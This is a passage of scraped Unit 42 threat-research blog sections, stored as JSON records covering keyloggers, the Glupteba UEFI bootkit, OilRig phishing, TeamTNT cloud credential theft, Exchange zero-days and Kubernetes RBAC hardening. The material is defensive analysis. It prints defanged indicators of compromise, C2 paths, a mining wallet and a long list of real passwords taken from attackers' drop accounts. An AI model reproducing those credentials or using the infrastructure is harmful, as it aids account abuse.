relationship to each other, and explain how they evolved from one another through new ownership or branding of the tools. The intent of this blog is not to rehash what has already been discussed, but instead to shift the focus to the actors behind these keylogger threats and show a practical technique for identification.\nTo be of any value, keyloggers must transmit data back to the attacker. There are three well-established methods for doing this: HTTP, SMTP, and FTP. HTTP transmission usually involves a simple POST request with a body containing the stolen data; however, for SMTP and FTP, more often than not these protocols require authentication to log into a service before transferring the data from the compromised system. This presents a valuable data point, because all of the big four keylogger families embed their credentials inside of their binaries. This further provides an analyst with a remote server address, username, and password for each sample analyzed. Couple this with the increase of keyloggersfound in the wildand we find ourselves with a very large data set that can be used for correlation.\nBy using Palo Alto Networks AutoFocus, I was able to quickly identify 500 recent samples of HawkEye and iSpy, which exhibited either FTP or SMTP activity during dynamic analysis. After downloading the samples and their respective network activity, I parsed out all successful FTP and SMTP activity to build a data set for Maltego. We'll use these embedded credentials to try to uncover patterns and find actor-identifiable data through our research.\nBefore getting into the correlation, some general statistics on the data:\n207 FTP connections were caught with active credentials, e.g., the malware successfully logged into the FTP server to upload data from our virtual test machines \n53 SMTP connections were made with active credentials \n37 unique drop destinations were identified for stolen data \n96 unique accounts used to log into these drop sites\nAfter collecting all of the data from PCAPs and loading it into Maltego, we can visually see multiple organic clusters standout along the top, which will be the topic for discussion.\nFigure 1. Key logger clusters", "source": "Palo"}, {"title": "Conclusion", "content": "In the grand scheme of keylogger activity, this was a small sample set. Despite this, it was enough to highlight that using embedded credentials at scale could be leveraged to gain insight into actor behavior and infrastructure. It's a practical technique and quickly identified at least four different actors actively utilizing keyloggers to steal data from compromised systems.\nIt should be obvious, but it's worth stating: keyloggers aren't going anywhere and without a doubt they will only continue to evolve like every other type of malware. As this happens and we're left trying to protect our organizations, sometimes we can get lost in the analysis of minute details between various malware families, so it helps to change perspective now and again and take more of a macro look at the landscape in front of you.\nThere is always a human element to these threats and, as evidenced throughout this blog and countless others, the people behind these threats can fall prey to the same issues that organizations do \u2013 poor operational security.\nPalo Alto Networks customers are protected by these various threats through WildFire AV signatures. AutoFocus customers can further research these threats through the below tags.\nAutoFocus Tag - iSpy SoftwareAutoFocus Tag - PredatorPain/HawkEyeAutoFocus Tag - KeyBase\nBelow are additional indicators from the discussed sample set, including the ones shown above, that were observed by the malware. Please note that individually, these indicators may not be enough to determine whether something is good or bad, but the combination of multiple indicators can lead to actionable intelligence. Account names will not be included in an effort to prevent any potential abuse from the credential pairs.\nIP/Domains:\n107.180.44[.]128 \n107.180.57[.]26 \n108.179.196[.]24 \n109.234.36[.]216 \n134.255.221[.]14 \n136.243.113[.]211 \n142.54.182[.]66 \n144.76.222[.]41 \n176.9.193[.]213 \n185.26.122[.]38 \n185.28.20[.]80 \n188.40.207[.]191 \n192.138.189[.]30 \n192.185.143[.]215 \n198.58.93[.]56 \n204.236.238[.]164 \n208.86.156[.]40 \n217.149.52[.]111 \n23.229.206[.]201 \n31.170.165[.]170 \n31.177.95[.]21 \n5.153.10[.]228 \n50.87.151[.]103 \n54.228.213[.]93 \n64.20.39[.]210 \n66.7.201[.]36 \n68.171.217[.]250 \n69.27.174[.]4 \n69.30.206[.]114 \n75.101.155[.]12 \n81.95.158[.]149 \n93.189.45[.]35 \ndallas125.mysitehosted[.]com \nmd-in-15.webhostbox[.]net \ns2.dedicatedpanel[.]net \nweb.arch[.]ai \nshamaraholdinq[.]com \npmtlogisticsinc.co[.]uk \nadaata[.]com \naffilor[.]org \nal-nebaa[.]net \nalexendriaairlines[.]com \namerican-petroleum[.]us \namericanmilitary[.]co \narmydepartment[.]us \narmydept[.]us \natozcourierservices[.]com \naviatoncapital[.]com \nciafleasinq[.]com \nconoilng[.]com \ndefencecourierservice[.]com \ndefensecourierdelivery[.]org \ndefensecourierservice[.]com \nduluxsecuritiesinc[.]com \nedfenergy[.]us \nfasttrackexpressdelivery[.]us \nfbideptinvestigate[.]us \nfcmbservices[.]com \nfelixairvvays[.]com \nfifaregionalprojects[.]org \nfirstrepublicbkc[.]org \ng-t-b-online[.]com \ngaffrey-kroese[.]com \ngcb-gh[.]com \ngcb-gh[.]net \ngcb-ghana[.]com \ngcb-info[.]com \ngh-consultant[.]com \nghobashco[.]com \nhorizons-us[.]com \nhsbc-onlineservices[.]com \ninformation-ny[.]com \ninvestigateinterpol[.]net \nlibrarytech[.]net \nmaincentralbnk[.]com \nmemconpjo[.]com \nnawesservices[.]com \nnicemachs[.]com \nnigeria-custom[.]com \notizjo[.]com \npacificliife[.]com \npannoceanic[.]com \npetronas-malaysia[.]com \nqirnemhemrinco[.]com \nqtps-inc[.]com \nsatanderonlineservices[.]com \nsonozcape[.]net \nstandardbnkforex-za[.]com \ntechenica[.]com \ntsa-bwi[.]com \nubacare[.]com \nunfraudunit[.]com \nunpf[.]us \nusamilitarydept[.]us \nusaphysicist[.]us \nushomeland-security[.]us \nzs-dds[.]com\nPasswords:\n0Withgod1 \n0gZ3I%dmpXi5 \n238Wmi9cnJ \n4Z*~uigF{mKD \n92z7nyy6CU \nA.?G34p}b);w \nADmin7455& \nATIba2001! \nC7,5#dg4X1b? \nChimaeze12 \nConfirmed1 \nF:SBrjW1 \nGeneral123# \nH;cLNBkHKO&g \nKunde54321 \nLAURINA12 \nNelson12345 \nP!{Xwn{eEV$T \nPwd123456@@123 \nQsvGK8H9XGJ8 \nTeam2318@ \nUnbekannt88_$(98) \nWaly1981 \nZzZ_#C0FA)^# \n^al3M@1cr.eW \na4def60f \nabacom12345 \nabuchi12345 \nabuchi54321 \naccounts1961 \nalfred54321 \nbathram0123 \nbethel54321 \nbro54321 \nchibueze54321 \nchimaeze12 \ncodin1234 \ncompu54321 \ndogood11 \nduracellgrief \nebuka12345 \nhumble12345 \nimmortal12345 \njoinkrama2 \njs123! \nk*wsOH*P]!up \nkaluojuotta1234 \nkaycelaz5 \nkelechi12345 \nkunde54321 \nloco1234 \nmiraclebaby16 \nnathaniel \nnathaniel45 \nnde10wp10 \nnineslips09 \nobi12345 \nodichigo54321 \nopera54321 \nowerrisouth \npentium12345 \npereyikelamo2 \nphilip54321 \npokerdick123 \npwd12345 \nshoki54321 \nspencer098765 \nsular54321 \nsular@54321 \nteam2318 \nvictory45 \nwp@@123123 \nxpen2000", "source": "Palo"}, {"title": "Introduction", "content": "Glupteba is advanced, modular and multipurpose malware that, for over a decade, has mostly been seen in financially driven cybercrime operations. This article describes the infection chain of a new campaign that took place around November 2023.\nDespite being active for over a decade, certain capabilities that Glupteba's authors have added have remained undiscovered or unreported \u2013 until now. We will focus on one intriguing and previously undocumented feature: a Unified Extensible Firmware Interface (UEFI) bootkit. This bootkit can intervene and control the OS boot process, enabling Glupteba to hide itself and create a stealthy persistence that can be extremely difficult to detect and remove.\nWhile this threat began as a simple backdoor, it transformed into a potent botnet, emerging as a major player in the realm of cyberthreats. Since its discovery in the early 2010s, Glupteba has evolved significantly and undergone a series of stealthy metamorphoses. This threat is particularly known for its elaborate infection chains that showcase its operators' continuous developments and their attempts to evade traditional security measures.\nPalo Alto Networks customers are better protected from malware discussed in this article through products likeCortex XDR, ourNext-Generation FirewallwithCloud-Delivered Security Servicesthat includeAdvanced WildFire,Advanced Threat PreventionandAdvanced URL Filtering. Additionally,Prisma CloudCortex XDR Cloud Agents or Prisma Cloud Defender Agents monitor for instances of known Glupteba malware.DNS Securitycan block malicious domains.\nSpecifically for UEFI bootkits such as Glupteba's, the UEFI Protection module released as part of Cortex Agent 8.3 provides detection and prevention capabilities.\nA note on acronyms: this article uses multiple acronyms. We've listed out terms that are either used together in sequence or may be unfamiliar to analysts of different backgrounds.", "source": "Palo"}, {"title": "Introduction", "content": "UEFIis a specification that defines the architecture of the platform firmware used for booting the computer hardware and its interface for interaction with the operating system.\nFigure 6 reveals the different stages of the boot process in a UEFI system.\nIn the stages before boot device selection in Figure 6, the system's firmware is loaded from a Serial Peripheral Interface (SPI) flash memory. Then the EFI system partition (ESP), located in the boot device and containing the Windows Boot Manager, is loaded as the host boots into Windows.\nA malware implant in the ESP is enough to execute code before Windows starts, where it can easily disrupt various security mechanisms. Another possibility is an implant in the SPI flash memory that executes code at earlier stages of the boot process, enabling even greater power and flexibility. However, malware using a firmware implant in flash memory requires higher privileges than using an ESP implant. This is more complex.\nAs of 2023, only a handful of UEFI bootkits have been publicly reported in the wild, such asLoJax(a firmware implant) andBlackLotus(an ESP implant).", "source": "Palo"}, {"title": "Summary", "content": "As documented in aprevious analysis by Sophos, Glupteba formerly used Windows kernel drivers to hide itself. To successfully load these drivers, Glupteba usedDSEFixor Universal PatchGuard and Driver Signature Enforcement Disable (UPGDSED).\nDSEFix drops a known vulnerable driver and exploits it to disable DSE in kernel memory. UPGDSED runs inuser-modeand patches the Windows kernel and Windows Boot Loader binaries for the same purpose.\nOur current samples reveal that Glupteba has added EfiGuard to its arsenal of tools that are capable of disabling DSE.\nIn the installer, the functionmain_installDrivercalls the previous function we analyzed (main_writeEfiGuard), which writes the files in the ESP. We give a high-level overview of the logic in this function in Figure 18 below, by grouping its nodes in IDA.\nAs revealed in Figure 18, any one of the three DSE bypasses we have mentioned (DSEFix, UPGDSED or EfiGuard) might be used, depending on the architecture, OS version and configuration. Unlike the BlackLotus ESP implant, we have not seen any evidence for Glupteba bypassing Secure Boot.", "source": "Palo"}, {"title": "Conclusion", "content": "In the ever-evolving threat landscape, Glupteba malware continues to stand out as a notable example of the complexity and adaptability exhibited by modern cybercriminals.\nThe identification of an undocumented UEFI bypass technique within Glupteba underscores this malware's capacity for innovation and evasion. This novel method not only poses a significant challenge for detection but also highlights the pressing need for cybersecurity professionals to continually enhance their defenses and stay ahead of emerging threats.\nFurthermore, with its role in distributing Glupteba, the PPI ecosystem highlights the collaboration and monetization strategies employed by cybercriminals in their attempts at mass infections. This model indicates that threat actors leverage underground economies to proliferate malware, and it emphasizes the importance of holistic cybersecurity strategies and multilayer security solutions that extend beyond traditional defenses.", "source": "Palo"}, {"title": "Introduction", "content": "The group behind the OilRig campaign continues to leverage spear-phishing emails with malicious Microsoft Excel documents to compromise victims. As an example, the following email was sent to a Turkish government organization using a lure of purported new portal logins for an airline's website. (Please note that the sender email used in the figure below may have been spoofed.)\nFigure 1 Phishing email sent to Turkish government organization\nWhen the users.xls file is executed and macros are enabled, the victim is presented with the following decoy document.\nFigure 2 Content contained in malicious Helminth XLS file\nThis same document content was used with Helminth samples targeting government organizations in multiple nations. For those particular attacks, the following filenames were witnessed:\nHelp-Yemen.xls \nusers.xls\nIn addition to these instances, multiple Qatari organizations were the subject to spear phishing attacks carrying Helminth samples earlier this year. In those cases, the documents used to carry the malicious macro code were very specific to the organization receiving them and in some cases were sent from partner organizations that already had a relationship with the recipient.", "source": "Palo"}, {"title": "Conclusion", "content": "The attackers using the Helminth and Clayslide malware families continue to target various high value companies and organizations across the globe using their customized malware. This malware is under active development and continues to be updated and improved upon, as witnessed in the files discussed in this blog post. While the malware deployed is not terribly sophisticated, it uses techniques such as DNS command and control (C2) that allows it to stay under the radar at many establishments.\nPalo Alto Networks customers are protected against this threat in the following ways:\nWildFire identifies all Helminth and Clayslide samples as malicious \nDomains identified as command and control servers are flagged as malicious \nAutoFocus tagsHelminthandClayslidemay be used to track this group", "source": "Palo"}, {"title": "Indicators", "content": "F04CF9361CF46BFF2F9D19617BBA577EA5F3AD20EA76E1F7E159701E446364FCE2EC7FA60E654F5861E09BBE59D14D0973BD5727B83A2A03F1CECF1466DD87AA31DB0841C3975BE5395F13C894B7E444D150CC701487B756FFF43CE78D98B1E6C3C17383F43184A29F49F166A92453A34BE18E51935DDBF09576A60441440E51C6437F57A8F290B5EC46B0933BFA8A328B0CB2C0C7FBEEA7F21B770CE0250D3D5A2C38BE89AC878D28080A7465C4A3F8708FB414B811511B9D5AE61A47593A69BD0920C8836541F58E0778B4B64527E5A5F2084405F73EE33110F7BC189DA7A990639C7423A329E304087428A01662CC06E2E9153299E37B1B1C90F6D0A195ED528D432952EF879496542BC62A5A4B6EEE788F60F220426BD7F933FA2C58DC6B3772D473A2FE950959E1FD56C9A44EC48928F92522246F75F4B8CB134F4713FFF3856C7AF3C9F84101F41A82E36FC81DFC18A8E9B424A3658B6BA7E3C99F54F20CD9857A3F626F8E0C07495A4799C59D502C4F3970642A76882E3ED68B790F8E80161DAD1603B9A7C4A92A07B5C8BCE214CF7A3DF897B561732F9DF7920ECB3ED874F513A032CCB6A5E4F0CD55862B024EA0BEE4DE94CCF950B3DD894066065D5E9DDB25BDE3719C392D08C13A295DB418D7ACCD25D82D020B425052E7BA6DC9299BC738D7B0292820D99028289280BA24D7FB985851D9C74060AF7950CECEF02E226A0210A123AD828803EB871B74ECBDB702FC4BABD9FF786231C486FF65E0F1DE7B941817438DA2A4B7284BC56C291DB7312E3BA5E2397B3621811A816AA365920EAEA00764A245ACB58A3565941477B78A7BCC9EFAEC5BF811573084B6CF742A52084162D3789E196FB5FF6F8E2983147CD914088BD5F9ED363D7A5B0DF04E5B85EA68BF8F2306B6B931810AE38C8DFF3679D78DA1AF2C91032C3638035336D4B4B018EC78A79F3C06DC30EC77C250307628A7631F6B5B5995E797D0674F005DDE45A6F1D9B2A254E71F89F12AB0DFAAA48D081F5C0A434800BD5C3270862C4BCAB135BF1846684B598E66E3F51443F70F9E8D0544F3417774CBE907E8EFC4FBC723981FC94884F0F493CB8711FDC9DA698980081D9B7C139FCFFBE723DACFFC694ACE3E1547007AE00437536F2A88BA60179C51F23228E696FB02AFDC860B9437DD87A3C24ED7D200F9B870D69F9B7AD918C51325C11444DF8BC6FB97BA903B6D948C16DC92B69FE1DE76CF64AB8377893770BF47C29BF91F3FD987F9968BFBB637FE72DA5C9AEE9857CA81FA54A5ABE7F2D1B061BC2A376943C63727C79C0A33A5DC62933F17506F20E0258F877947BDCD15B091A597EAC05D299B747193940B5E764F2F4A2D893BEBEF4BF1F7D63C4DB856877020A5852A6647CB04A00EC288AC8C4AA045A45526C2939DBD843391C9C75FA4A3BCC0A6D7DC692FDCD1089BF971E8839DB818AC462F53F82DAED523C413BFC2E01FB76DD70B37162AFED808F3109822C185F1D8E1BF7EF7781C219DC56F5906478651748F0ACE489D343986D54B00647B507B2AFD708B7A1CE4C37027FB77D67C6BC3C20C3AC1A88CA41B2FEE00D28782076178A63E669D2306C37BA0C417708D4DC1F751765C3F94E1662C53E69B66D62A4822E666031FD441BBDFA741E20D4511C6741EC3CB02475FF5A64DE9087B138608CCF036B067D91A47302259269FB05B3349964CA4060E7EA787C0E42608F9A69F718F6DCA5556607BE45EC77D17B07EB9EA1E0F7BB2E0644B5112F0FB64825B879B01D686E8F4D43521252A3B4F4026C9D1D76D3F15B2813AF6DFA4CEBD82F48B6638A9757730810707D79D961DDE1B72D3768E972E6184", "source": "Palo"}, {"title": "Introduction", "content": "On December 24, 2015, Unit 42 identified a targeted attack, delivered via email, on a high profile Indian diplomat, an Ambassador to Afghanistan. The body and content of the email suggest that it was crafted and spoofed to look like it was sent by the current Defence Minister of India, Mr. Manohar Parrikar, commending the Ambassador on his contributions and success.\nIndia has been a key nation in building and funding Afghanistan's infrastructure and economic development, which includes setting up iron ore mines, steel plants, power plants and transportation systems, helping reconstruct the Salma Dam and constructing a newParliament Complexfor the Afghan Government.\nGivenIndia's significant contributionsto the development of Afghanistan, it is likely that there may be groups or nations who would be interested in tracking and spying on key individuals who officially represent India in Afghanistan.", "source": "Palo"}, {"title": "Summary", "content": "OpenCV has been extensively used by organizations, government bodies, and research groups for real time capture, image manipulation, object detection and many other uses in new forms of Human-Computer interaction, security systems, driver-less cars among many others. OpenCV was also used by theMars Roversto send captured data back to Earth.\nIt is interesting to see the very code used in such significant projects also being used to track and spy on individuals being targeted and which can remain undetected by traditional security systems. Though 'Rover' is an unsophisticated malware lacking modern malware features, it seems to be successful in bypassing traditional security systems and fulfilling the objectives of the threat actor behind the campaign in exfiltrating information from the targeted victim. It is important to understand the techniques and tools being used by such threat actors to better defend and protect organizations from such threats.\nPalo Alto Networks AutoFocus users can identify this threat using theRover tag.", "source": "Palo"}, {"title": "Introduction", "content": "The concept of file-less malware is not a new one. Families likePoweliks, which abuse Microsoft'sPowerShell, have emerged in recent years and have garnered extensive attention due to their ability to compromise a system while leaving little or no trace of their presence to traditional forensic techniques.\nSystem administrators have lauded the power and versatility of PowerShell since version 2.0's integration into Windows 7. Unfortunately, with such versatility comes the opportunity for abuse, specifically surrounding the capability to write directly into memory of the host OS.\nTypically, file-less malware has been observed in the context of Exploit Kits such as Angler. Palo Alto Networks has observed a recent high-threat spam campaign that is serving malicious macro documents used to execute PowerShell scripts which injects malware similar to theUrsnif familydirectly into memory. We call the malware PowerSniff.", "source": "Palo"}, {"title": "Conclusion", "content": "This widespread spam campaign has been witnessed in the past week. Due to the target-specific details contained within the spam emails and the use of memory-resident malware, this particular campaign should be treated as a high threat. As this malware relies on malicious macros within Microsoft Word documents, users should ensure that macros are not enabled by default and should be wary of opening any macros in files received from untrusted sources.\nPalo Alto Networks WildFire customers are protected against this threat, as all encountered files have been correctly flagged as malicious. Additionally, all C2 domains currently encountered have also been marked malicious. AutoFocus users can identify this malware using thePowerSnifftag.\nThe researchers would like to thank Cert.pl's @maciekkotowicz for his excellent analysis of the configuration data of the malware.", "source": "Palo"}, {"title": "Indicators", "content": "a8663becc17e34f85d828f53029ab110f92f635c3dfd94132e5ac87e2f0cdfc330cd5d32bc3c046cfc584cb8521f5589c4d86a4241d1a9ae6c8e9172aa58ac730661c68e6c247cd6f638dbcac7914c826a5feee1013e456af2f1f6fd642f4147f204c10af7cdcc0b57e77b2e521b4b0ac04667ccffce478cb4c3b8b8f18e32a27e22ea4e06b8fd6698d224ce04b3ef5f00838543cb96fb234e4a8c84bb5fa7b3f45bf212c43d1d30cc00f64b3dcae5c35d4a85cacd9350646f7918a30af1b7091e746ba37c56f7f2422e6e01aa6fde6f019214a1e12475fe54ee5c2cf1b9f083340f82a198aa510159989058f3f62861de74135666c50060491144b7b3ec5a6f815bd46e66f1d330ed49c6f4a4e570da2ec89bcd665cedf025028a94d7b0cc1ea1770a7671679f13601e75a7cb841fea90c7add78436a0bea875ce50b92afc3383e305724e9cd020b8f80535c5dd897b2057cee7d2bb48461614a37941e78e3a74ec24b5d08266d86c59718a4a476cfa5d220b7b3c8cc594d4b9efc03e8bee0d90a7951683a5a77a21d4a544b76e2e6ee04e357d2f5bfcff01cd6924906adf772c21dafcb4f50cae47d0d4314810226cba3ee4e61811f5c778353c8eac9ba7dc247511ab6d7d3820b9d345bb899a7827ce62c9dd27c538c75a73f5beba6c6018708374a4dfaaa8e44ee217ca5946511cacec55da5eabb0feb1df321753258782136379754edd05c20d5162aed7e10774a95657f69d4f9a5de17a8059c9018aa65d215ef3affe320efe4f5034513697675de40ba8878ca82e80b07ad1b8d61ed8\nsupratimewest[.]comletterinklandoix[.]netsupratimewest[.]bizstarwoodhotels[.]pwoklinjgreirestacks[.]bizwww.starwoodhotels[.]pwbrookmensoklinherz[.]org", "source": "Palo"}, {"title": "Introduction", "content": "TeamTNT has been evolving their cloud-focused cryptojacking operations for some time now. TeamTNT operations have targeted and, after compromise,exfiltrated AWS credentials, targetedKubernetes clustersand created new malware called Black-T thatintegrates open source cloud native toolsto assist in their cryptojacking operations. TeamTNT operations are now using compromised AWS credentials to enumerate AWS cloud environments, via the AWS platform's API. These actions attempt to identify allIdentity and Access Management (IAM)permissions,Elastic Compute Cloud (EC2)instances,Simple Storage Service (S3)buckets,CloudTrailconfigurations andCloudFormationoperations granted to the compromised AWS credential. TeamTNT operations are now also targeting the credentials of 16 additional applications, including those of AWS and Google Cloud credentials, which may be stored on the compromised cloud instance, if installed.\nThe presence of Google Cloud credentials being targeted for collections represents the first known instance of an attacker group targeting IAM credentials on compromised cloud instances outside of AWS. While it is still possible that Microsoft Azure, Alibaba Cloud, Oracle Cloud or IBM Cloud IAM credentials could be targeted using similar methods, Unit 42 researchers have yet to find evidence of credentials from these cloud service providers (CSPs) being targeted. TeamTNT first started collecting AWS credentials on cloud instances they had compromised as early asAugust 2020.\nIn addition to the targeting of 16 application credentials from cloud applications and platforms, TeamTNT has added the usage of the open-source Kubernetes and cloud penetration toolsetPeiratesto their reconnaissance operations. With these techniques available, TeamTNT actors are increasingly more capable of gathering enough information in target AWS and Google Cloud environments to perform additional post-exploitation operations. This could lead to more cases of lateral movement and potential privilege escalation attacks that could ultimately allow TeamTNT actors to acquire administrative access to an organization's entire cloud environment.\nThat said, TeamTNT operations are still focused on cryptojacking. The TeamTNT cryptojacking operations represented within this writing have collected 6.52012192 Monero coins, which at the time of this writing equaled $1,788 USD. The mining operation was found to be operating at an average speed of 77.7KH/s across eight mining workers. Operations using this Monero wallet address have continued for 114 days as of the time of this writing.\nPalo Alto NetworksPrisma Cloudcustomers are protected from these threats through the Runtime Protection feature, Cryptominer Detection feature and the Prisma Cloud Compute Kubernetes Compliance Protection, which alerts on an insufficient Kubernetes configuration and provides secure alternatives. Additionally, Palo Alto NetworksVM-SeriesandCN-Seriesproducts offer cloud protections that can prevent network connections from cloud instances toward known malicious IP addresses and URLs.", "source": "Palo"}, {"title": "Conclusion", "content": "Given TeamTNT's integration of tools such as Peirates, their targeting of cloud native network mesh applications such as Weave, their operations around Kubernetes and Black-T, and their targeting and subsequent taunting of organizations using Project Jupyter, TeamTNT actors are suspected to be employing all tools listed within this blog on a regular basis. TeamTNT actors are specifically targeting cloud platforms in an attempt to circumvent future security detection tools and embed themselves into the organization's cloud environment.\nWe recommend that organizations operating with cloud environments monitor for and block all network connections associated with TeamTNT's Chimaera repository, as well as historic Command and Control (C2) endpoints. Using a cloud native security platform will significantly reduce the cloud infrastructure's attack surface and allow organizations to monitor for risks.\nThe following tips are highly recommended by Unit 42 researchers to assist in the protection of cloud infrastructure.\nEnforce least-privilege IAM access policies to all cloud IAM roles and permissions. Where applicable, use short-lived or one-time-use IAM credentials for service accounts. \nMonitor and block network traffic to known malicious endpoints. \nOnly deploy vetted container images within production environments. \nImplement and use Infrastructure as Code (IaC) scanning platforms to prevent insecure cloud instances from being deployed into production environments. \nUse cloud infrastructure configuration scanning tools that enable governance, risk management and compliance (GRC) to identify potentially threatening misconfigurations. \nUse cloud endpoint agents to monitor and prevent the running of known malicious applications within cloud infrastructure.\nPalo Alto NetworksPrisma Cloudcustomers are protected from these threats through the Runtime Protection feature, Cryptominer Detection feature and the Prisma Cloud Compute Kubernetes Compliance Protection, which alerts on an insufficient Kubernetes configuration and provides secure alternatives. Additionally, Palo Alto NetworksVM-SeriesandCN-Seriesproducts offer cloud protections that can prevent network connections from cloud instances toward known malicious IP addresses and URLs.\n46EPFzvnX5GH61ejkPpNcRNm8kVjs8oHS9VwCkKRCrJX27XEW2y1NPLfSa54DGHxqnKfzDUVW1jzBfekk3hrCVCmAUrFd3H\n45.9.148[.]35/chimaera/bin/\n45.9.148[.]35/chimaera/data/\n45.9.148[.]35/chimaera/init/\n45.9.148[.]35/chimaera/pl/\n45.9.148[.]35/chimaera/py/\n45.9.148[.]35/chimaera/sh/\n45.9.148[.]35/chimaera/spread/\n45.9.148[.]35/chimaera/up/\npool.supportxmr[.]com\nTable 1. Enumerating AWS IAM configurations.\nTable 2. Enumeration Amazon EC2 instances.\nTable 3. Enumerating available Amazon S3 buckets\nTable 4. Enumerating open AWS support cases.\nTable 5. Enumerating available AWS network connections.\nTable 6. Enumerating AWS CloudTrail operations.\nTable 7. Enumerating AWS CloudFormation operations.", "source": "Palo"}, {"title": "Introduction", "content": "On March 2, the security community became aware of four critical zero-day Microsoft Exchange Server vulnerabilities (CVE-2021-26855,CVE-2021-26857,CVE-2021-26858andCVE-2021-27065).\nThese vulnerabilities let adversaries access Exchange Servers and potentially gain long-term access to victims' environments. While the Microsoft Threat Intelligence Center (MSTIC) attributes the initial campaign with high confidence toHAFNIUM, a group they assess to be state-sponsored and operating out of China, multiple threat intelligence teams, including MSTIC and Unit 42, are also seeing multiple threat actors now exploiting these zero-day vulnerabilities in the wild. Estimated number of potentially compromised organizations is in the tens of thousands globally \u2013 and very importantly, these vulnerabilities were being actively exploited for at least two months before the security patches were available. As a result, even if you patched immediately, your Exchange Servers could still be compromised. Further, based on telemetry collected from the Palo Alto Networks Expanse platform, we estimate there remain over 125,000 unpatched Exchange Servers in the world.\nBelow you will find a concise playbook that enterprises can follow to respond to this potential threat in their environments.", "source": "Palo"}, {"title": "Introduction", "content": "In recent weeks, Unit 42 has been analyzing delivery documents used in spear-phishing attacks that drop a custom downloader used in cyber espionage attacks. This specific downloader, Cmstar, is associated with the Lurid downloader also known as 'Enfal'. Cmstar was named for the log message 'CM**' used by the downloader.\nUnit 42 is aware of threat actors using two toolkits - MNKit and the Tran Duy Linh toolkit - to produce malicious documents that exploit CVE-2012-0158 in order to implant Cmstar. The Cmstar downloader itself has several unique and interesting features, as well as substantial infrastructure overlap with other tools worth discussing.", "source": "Palo"}, {"title": "Conclusion", "content": "The Cmstar tool has several interesting features, including a previously unseen method of manually creating its import address table using an API function name character to offset mapping techniques, and a hashing algorithm used to find antivirus processes on an infected system. Both of these features are noteworthy and may provide the ability to correlate future tools to the same group and/or malware authors.\nThe URL used by Cmstar to communicate with its C2 server, as well as significant infrastructure overlap, show a direct relationship between the Cmstar downloader, Lurid/Enfal and Cmwhite tools. In a majority of the cases, threat actors using the Cmstar downloader initially register the C2 domains using the email address 'WANGMINGHUA6@GMAIL[.]COM' and later change the registration information to include a different email address. Unit 42 cannot positively confirm that the threat actors control the 'WANGMINGHUA6@GMAIL[.]COM' email address, or if the email address belongs to a reseller that the threat actors buy domains from to create their infrastructure; however, we do believe this is an interesting TTP worth tracking in future infrastructure enumeration.\nTHE \"LURID\"DOWNLOADER - Nart Villeneuve and David Sancho -http://la.trendmicro.com/media/misc/lurid-downloader-enfal-report-en.pdf \nAttacks on East Asia using Google Code for Command and Control\u2013 Jen Miller-Osborn and Rob Downs -- http://blog.paloaltonetworks.com/2014/08/attacks-east-asia-using-google-code-command-control/ \nLinking APTs from 2011 and 2014 to an Active Scam Network \u2013 Kiel Wadner -https://www.bluecoat.com/security-blog/2014-10-08/linking-apts-2011-and-2014-active-scam-network", "source": "Palo"}, {"title": "Introduction", "content": "Malware authors regularly evolve their techniques to evade detection and execute more sophisticated attacks. We've commonly observed one method over the past few years: unsigned DLL loading.\nAssuming that this method might be used by advanced persistent threats (APTs), we hunted for it. The hunt revealed sophisticated payloads and APT groups in the wild, including the Chinese cyberespionage groupStately Taurus(formerly known asPKPLUG, aka Mustang Panda) and the North Korean Selective Pisces (aka Lazarus Group).\nBelow, we show how hunting for the loading of unsigned DLLs can help you identify attacks and threat actors in your environment.\nPalo Alto Networks customers receive protections and detections against malicious DLL loading through theCortex XDR agent.", "source": "Palo"}, {"title": "Conclusion", "content": "Most detection techniques for blocking malicious DLLs rely on the module's behavior after it has been loaded into memory. This can limit the ability to block all malicious modules.\nThat said, you can proactively hunt for malicious unsigned DLLs using hunting approaches such as the ones presented in this blog.\nKnowing the baseline of your network in terms of legitimate software or behavior can reduce the number of results generated by the above queries, allowing you to focus on results that might be suspicious.\nCortex XDR alerts on and blocks malicious DLLs loaded by known hijacking techniques, and can also prevent post-exploitation activities, through the Behavioral Threat Protection and Analytics modules.\nIndicators of compromise and TTPs associated with Stately Taurus can be found in the Stately TaurusATOM.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call North America Toll-Free: 866.486.4842 (866.4.UNIT42), EMEA: +31.20.299.3130, APAC: +65.6983.8730, or Japan: +81.50.1790.0200.", "source": "Palo"}, {"title": "Introduction", "content": "Prisma Cloud and Unit 42 recently released areport examining the use of powerful credentialsin popular Kubernetes platforms, which found most platforms install privileged infrastructure components that could be abused for privilege escalation. We're happy to share that, as of today, all platforms mentioned in our report have addressed built-in node-to-admin privilege escalation. However, it's possible third party add-ons might reintroduce the issue.\nIn the research we presented atKubeCon EU and BlackHat USA, we found that in half the platforms, any container escape had previously allowed for a full cluster compromise because all nodes hosted admin-equivalent credentials. Most of the platforms mentioned in our report made their infrastructure unprivileged by default, while one did so through an optional add-on.\nStripping permissions is often complex, and we recognize fixing this is no small matter. We'd like to thank Azure Kubernetes Service (AKS), AWS Elastic Kubernetes Service (EKS), Google Kubernetes Engine (GKE), RedHat OpenShift Container Platform, Antrea and Calico for working to harden their access control.\nWe provide a short recap of our research and look into the different mitigations the platforms implemented to address privilege escalation and powerful permissions in Kubernetes. If you're interested in evaluating your own cluster's Role Based Access Control (RBAC) posture, tryrbac-police, our open-source RBAC analyzer for Kubernetes.\nPrisma Cloudusers can catch Kubernetes misconfigurations like excessive RBAC permissions before they're deployed to the cluster via theCloud Code Security(CCS) module. In the runtime phase, users can rely on the built-inadmission controller for Kubernetesto enforce policies that alert on suspicious activity in their clusters, including Kubernetes privilege escalation.", "source": "Palo"}, {"title": "Conclusion", "content": "Maintaining a secure RBAC posture in Kubernetes is complex, both for platforms and users. When leading platforms enforce hardened defaults, it's easier for Kubenetes users to adopt secure architectures.\nWe'd like to thank each of the platforms mentioned in this blog for taking the difficult problem of unprivileged infrastructure head on, and coming up with creative implementations to solve it.\nWe recommend Kubernetes users and platforms automate the detection of RBAC misconfigurations in their CI/CD pipelines through tools likeCheckovandrbac-police. For managed services, even when an infrastructure component requires risky permissions, a validating admission webhook might be able to prevent misuse.\nSee our report,Kubernetes Privilege Escalation: Excessive Permissions in Popular Platforms, for more information.Prisma Cloudusers are encouraged to read the report's \"Prisma Cloud\" section to learn how Prisma'sKubernetes IaC scanning capabilitiesand the built-inadmission controller for Kubernetescan tackle the challenges of securing Kubernetes identities.", "source": "Palo"}, {"title": "Introduction", "content": "As part of our initiative to improve security in the cloud-native landscape, I conducted a security audit of multiple Go libraries that Kubernetes is based on. In my research, I foundCVE-2021-20291incontainers/storagethat leads to a 